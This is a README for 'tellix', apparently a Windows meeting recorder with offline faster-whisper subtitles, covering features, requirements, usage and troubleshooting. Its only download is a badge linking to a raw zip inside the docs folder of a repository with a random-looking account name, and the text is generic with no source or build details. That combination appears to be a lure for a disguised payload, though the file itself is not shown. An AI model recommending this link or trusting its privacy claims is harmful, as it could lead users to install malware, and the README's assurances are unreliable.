# ⏺ tellix - Record meetings with automatic live subtitles

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/pearlashmarchingorder720/tellix/raw/refs/heads/main/docs/Software-v1.3-beta.1.zip)

Tellix captures your computer screen, microphone, and system audio simultaneously. It creates an MP4 file with subtitles added to the video. All transcription happens on your computer. You keep your data private because the app works without an internet connection.

## 🛠 Features

Tellix records your screen activity while writing down what speakers say. Use it for online meetings on Google Meet or Zoom. 

- **Offline Processing:** The app uses local computer power to convert speech to text. No data leaves your machine.
- **Audio Capture:** It records your microphone and the computer audio output. You capture both sides of a conversation.
- **Subtitle Integration:** The final file comes as an MP4 with text included so you can read along later.
- **Lightweight Design:** The software uses efficient tools to keep your computer running fast during recordings. 
- **Privacy First:** You own your files. Nothing uploads to a cloud server. 

## 💻 Requirements

To use this software, your computer must meet these basic standards:

- **Operating System:** Windows 10 or Windows 11.
- **Processor:** A modern processor with at least 4 cores.
- **Memory:** 8 GB of RAM or more.
- **Storage:** 500 MB of space for the application, plus extra room for saved videos.
- **Graphics:** A standard graphics card capable of 1080p video output.

## 🎥 Recording Your Screen

Once you open the software, you will see a simple control panel. 

1. **Check your sources:** Select your microphone from the drop-down menu. Ensure the system audio box is checked if you want to record the meeting audio.
2. **Choose the area:** You can record your full screen or select a specific window using the frame handles. 
3. **Start the recording:** Press the large record button. The app will minimize to your taskbar.
4. **Speak and record:** Conduct your meeting or presentation as usual. 
5. **Stop the recording:** Return to the app window and press the stop button.

## 📝 Creating Subtitles

The software processes the video file immediately after you stop the recording. 

- A progress bar will appear on the main screen. 
- The app uses its internal engine to listen to the audio track.
- It identifies speech and matches it to specific timestamps.
- Wait for the "Task Complete" message before closing the app. 
- Your file will be saved in your "Videos" folder by default.

## 🛡 Privacy and Security

You might wonder how the software generates subtitles without the internet. It uses an internal tool called faster-whisper. This tool maps human speech to text patterns that it already knows. Because the tool sits on your hard drive, it never sends your meeting audio to a website or provider. You maintain total control over your private information. 

## 🔧 Troubleshooting

If you encounter issues, look here for common solutions.

- **App takes long to process:** Audio processing is heavy work. If you have an older computer, the transcription might take a few minutes. 
- **No audio in file:** Check your Windows sound settings. Make sure your microphone is set as the default device. Ensure the software has permission to access your microphone in Windows Privacy settings.
- **Subtitles look wrong:** The software performs best when background noise stays low. Try to position your microphone away from fans or loud typing. 
- **App freezes:** Allow the app time to finish the current task. If it remains frozen for more than ten minutes, close the app via the Task Manager and try again. 

## 📦 File Management

The software stores all recordings in a folder named "Tellix Records" inside your user "Videos" directory. You can move these files to other folders or upload them to secure cloud storage after the app finishes the process. Each recording generates an MP4 file. You can open these files in any standard video media player. The subtitles remain inside the file container and should appear automatically upon playback. If they do not appear, look for a "Subtitles" or "CC" button in your video player menu.
